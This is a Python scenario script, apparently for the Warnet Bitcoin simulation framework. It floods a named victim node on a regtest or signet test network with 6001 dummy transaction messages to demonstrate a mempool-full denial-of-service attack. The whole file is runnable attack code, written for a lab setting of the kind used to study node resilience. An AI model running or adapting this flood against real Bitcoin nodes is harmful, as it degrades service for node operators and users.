#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CTransaction,
    CTxIn,
    CTxOut,
    COutPoint,
    msg_tx,
    COIN,
    hash256,
)
from test_framework.p2p import MAGIC_BYTES, P2PInterface


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class MempoolFull(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate Mempool Full DoS attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/mempool_full_attack.py"

    def create_dummy_transaction(self):
        # Create a dummy transaction
        tx = CTransaction()

        # Add an input
        # Using a dummy previous transaction hash (all zeros)
        prevout = COutPoint(hash=0, n=0xFFFFFFFF)
        tx_in = CTxIn(prevout=prevout, scriptSig=b"", nSequence=0xFFFFFFFF)
        tx.vin = [tx_in]

        # Add an output
        # Send 1 BTC to a dummy script pubkey
        script_pubkey = bytes.fromhex(
            "76a914000000000000000000000000000000000000000088ac"
        )  # OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
        tx_out = CTxOut(nValue=1 * COIN, scriptPubKey=script_pubkey)
        tx.vout = [tx_out]

        # Calculate transaction hash
        tx.rehash()

        return tx

    # Scenario Entrypoint
    def run_to_test(self):
        # picking one node from the network to attack
        # we know this node is vulnerable to mempool_full DoS
        victim = "tank-0000-red"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")

        attacker = P2PInterface()

        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        tx = self.create_dummy_transaction()
        msg = msg_tx(tx)

        # Send multiple transactions
        for i in range(6001):
            # Modify the transaction slightly for each iteration to create unique txids
            tx.vin[0].prevout.n = i
            tx.rehash()
            msg.tx = tx

            attacker.send_and_ping(msg)
            self.log.info(f"Sent transaction message {i}")


def main():
    MempoolFull.main()


if __name__ == "__main__":
    main()
